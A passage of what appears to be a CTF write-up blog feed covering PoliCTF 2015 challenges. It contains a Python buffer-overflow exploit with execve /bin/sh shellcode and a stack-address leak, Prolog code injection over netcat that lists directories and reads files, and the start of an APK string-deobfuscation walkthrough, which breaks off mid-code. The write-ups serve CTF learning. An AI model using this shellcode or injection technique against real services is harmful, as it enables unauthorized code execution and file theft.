</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># mem leak</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;read:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;-793&#39;</span><span class="p">)</span>  
</span><span class='line'>  <span class="c"># -793*4 = 0xfffff39c; </span>
</span><span class='line'>  <span class="c"># 0x804867b &lt;read_from_library+58&gt;:   mov eax,DWORD PTR [eax*4+0x804a060] </span>
</span><span class='line'>  <span class="c"># -&gt; 0x80493fc == 0xffffffe0</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># leak stack addr</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">20</span><span class="p">)</span>
</span><span class='line'>  <span class="n">stackaddr</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">10</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stackaddr</span><span class="o">+</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;title:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;a&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;title:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># 2**32 -&gt; integer overflow, </span>
</span><span class='line'>  <span class="c"># we now have plenty of space to overwrite the saved return address</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4294967296&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># the reason i divided the nop sled is simple; for some reason, when the shellcode executes, </span>
</span><span class='line'>  <span class="c"># it overwrites itself if it&#39;s at the end. this solves it; didn&#39;t debug it </span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x30f</span><span class="o">-</span><span class="mi">37</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x83\xec\x7f\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcc\x80</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">stackaddr</span><span class="o">+</span><span class="mi">200</span><span class="p">))</span> <span class="c"># 0xffffd1ad -&gt; start of our buffer</span>
</span><span class='line'>      
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;exit&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;u&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>And running it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/polictf/johns-library<span class="nv">$ </span>python sn0w.py
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>ctf<span class="o">)</span>
</span><span class='line'><span class="nb">cd</span> /home/ctf
</span><span class='line'>ls
</span><span class='line'>challenge
</span><span class='line'>flag
</span><span class='line'>cat flag
</span><span class='line'>flag<span class="o">{</span>John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng<span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>flag{John_should_read_a_real_book_on_s3cur3_pr0gr4mm1ng}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Hanoi as a Service]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service/"/>
    <updated>2015-07-12T16:30:31+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-hanoi-as-a-service</id>
    <content type="html"><![CDATA[<p>Hanoi As A Service was a 50 point pwnable in PoliCTF and gave me a reason to hate PROLOG.</p>

<!--more-->


<p>We&rsquo;re given <code>nc haas.polictf.it 80</code> as point of attack. Let&rsquo;s start:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>
</span><span class='line'>ERROR: Prolog initialisation failed:
</span><span class='line'>ERROR: Syntax error: Unexpected end of clause
</span><span class='line'>ERROR: hanoi<span class="o">()</span>
</span><span class='line'>ERROR: ** here **
</span><span class='line'>ERROR: .
</span></code></pre></td></tr></table></div></figure>


<p>Interesting. I now know I&rsquo;m up against some Prolog program. Let&rsquo;s see if we can inject Prolog code:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, hanoi<span class="o">(</span>2<span class="o">)</span>.
</span><span class='line'>* Move top disk from a to c
</span><span class='line'>* Move top disk from a to b
</span><span class='line'>* Move top disk from c to b
</span></code></pre></td></tr></table></div></figure>


<p>Looks like we can! Now, since I never learned Prolog as a kid (I&rsquo;m more of a BASIC boy), I searched around for code examples. I couldn&rsquo;t just grab the flag so I started with enumerating.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>.
</span><span class='line'><span class="o">[</span>/home/ctf,/home/ubuntu<span class="o">]</span>
</span><span class='line'>
</span><span class='line'><span class="c"># enumerate /home/ctf:</span>
</span><span class='line'>
</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/ctf/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>. %
</span><span class='line'><span class="o">[</span>/home/ctf/haas<span class="o">]</span>bas@tritonal:~<span class="nv">$ </span>
</span><span class='line'>
</span><span class='line'><span class="c"># enumerate /home/ctf/haas:</span>
</span><span class='line'>
</span><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, expand_file_name<span class="o">(</span><span class="s1">&#39;/home/ctf/haas/*&#39;</span>, S<span class="o">)</span>, write<span class="o">(</span>S<span class="o">)</span>.
</span><span class='line'><span class="o">[</span>/home/ctf/haas/haas,/home/ctf/haas/haas-proxy.py,/home/ctf/haas/jhknsjdfhef_flag_here<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>I now had the location of the flag. Now, to read it&hellip; Turns out Prolog does not have a &ldquo;normal&rdquo; way to read arbitrary files (it expects Prolog terms or something). I searched for a good while and finally:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc haas.polictf.it 80
</span><span class='line'>Welcome to the Hanoi-as-a-Service cloud platform!
</span><span class='line'>How many disks does your tower have?
</span><span class='line'>0<span class="o">)</span>, open<span class="o">(</span><span class="s1">&#39;/home/ctf/haas/jhknsjdfhef_flag_here&#39;</span>, <span class="nb">read</span>, S<span class="o">)</span>, read_line_to_codes<span class="o">(</span>S, T<span class="o">)</span>, write<span class="o">(</span>T<span class="o">)</span>.
</span><span class='line'><span class="o">[</span>102,108,97,103,123,80,114,48,103,114,97,109,109,49,110,103,95,105,110,95,108,48,103,49,99,95,49,115,95,99,48,48,108,125<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Back to python!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="mi">102</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">123</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">103</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">95</span><span class="p">,</span><span class="mi">99</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">48</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">125</span><span class="p">]</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">a</span><span class="p">])</span>
</span><span class='line'><span class="n">flag</span><span class="p">{</span><span class="n">Pr0gramm1ng_in_l0g1c_1s_c00l</span><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>50 points and first blood for Team Vulnhub.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PoliCTF 2015 - Crack Me if You Can]]></title>
    <link href="http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can/"/>
    <updated>2015-07-12T12:12:22+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/07/12/polictf-2015-crack-me-if-you-can</id>
    <content type="html"><![CDATA[<p>Crack Me If You Can involved one of my least favorite things: Android APKs!</p>

<!--more-->


<p>I downloaded the APK and directly uploaded it to <a href="http://www.decompileandroid.com/">decompileandroid.com</a>. Among the decompiled files I found <code>src/it/politctf/LoginActivity.java</code> and three other java files. After inspecting <code>LoginActivity.java</code>, I found this function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="kt">boolean</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="o">(</span><span class="n">s</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">a</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">g</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">h</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">e</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">f</span><span class="o">(</span><span class="n">it</span><span class="o">.</span><span class="na">polictf2015</span><span class="o">.</span><span class="na">b</span><span class="o">.</span><span class="na">i</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">c</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">b</span><span class="o">(</span><span class="n">c</span><span class="o">.</span><span class="na">d</span><span class="o">(</span><span class="n">getString</span><span class="o">(</span><span class="mh">0x7f0c0038</span><span class="o">))))))))))))))))</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="n">Toast</span><span class="o">.</span><span class="na">makeText</span><span class="o">(</span><span class="n">getApplicationContext</span><span class="o">(),</span> <span class="n">getString</span><span class="o">(</span><span class="mh">0x7f0c003c</span><span class="o">),</span> <span class="mi">1</span><span class="o">).</span><span class="na">show</span><span class="o">();</span>
</span><span class='line'>            <span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
</span><span class='line'>        <span class="o">}</span> <span class="k">else</span>
</span><span class='line'>        <span class="o">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>        <span class="o">}</span>
</span><span class='line'>    <span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Interesting. It performs a bunch of operations on a string, which I don&rsquo;t know yet. However, on of the operations is this one:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">c</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;buga&quot;</span><span class="o">,</span> <span class="s">&quot;Goo&quot;</span><span class="o">);</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>So I did the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>strings crack-me-if-you-can.apk  <span class="p">|</span>grep buga
</span><span class='line'>ee<span class="o">[[</span>c%l<span class="o">][</span>c<span class="o">{</span>g<span class="o">}[</span>%<span class="o">{</span><span class="se">\%</span>Mc%spdgj<span class="o">=]</span>T%aat%<span class="o">=</span>O%bRu%sc<span class="o">]</span>c%ti<span class="o">[</span>o%n<span class="o">=</span>Wcs%<span class="o">=</span>No<span class="o">[</span><span class="nv">t</span><span class="o">=</span>T<span class="o">][</span>hct%<span class="o">=</span>buga<span class="o">[</span><span class="nv">d</span><span class="o">=</span>As%<span class="o">=</span>W<span class="o">]</span><span class="nv">e</span><span class="o">=</span>T%ho<span class="o">[</span>u%<span class="o">[</span>%g<span class="o">]</span>h%t<span class="o">[</span>%<span class="o">}</span>%
</span></code></pre></td></tr></table></div></figure>


<p>I now had the string and all the operations on the string:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">b</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;c&quot;</span><span class="o">,</span> <span class="s">&quot;a&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">b</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;%&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">c</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;[&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">d</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;]&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">e</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;\\{&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">f</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;\\}&quot;</span><span class="o">,</span> <span class="s">&quot;&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">g</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;c&quot;</span><span class="o">,</span> <span class="s">&quot;f&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">h</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replaceFirst</span><span class="o">(</span><span class="s">&quot;R&quot;</span><span class="o">,</span> <span class="s">&quot;f&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">i</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;=&quot;</span><span class="o">,</span> <span class="s">&quot;_&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="kd">public</span> <span class="kd">class</span> <span class="nc">c</span>
</span><span class='line'><span class="o">{</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">a</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;aa&quot;</span><span class="o">,</span> <span class="s">&quot;ca&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">b</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;aat&quot;</span><span class="o">,</span> <span class="s">&quot;his&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">c</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="na">replace</span><span class="o">(</span><span class="s">&quot;buga&quot;</span><span class="o">,</span> <span class="s">&quot;Goo&quot;</span><span class="o">);</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">d</span><span class="o">(</span><span class="n">String</span> <span class="n">s</span><span class="o">)</span>
</span><span class='line'>    <span class="o">{</span>
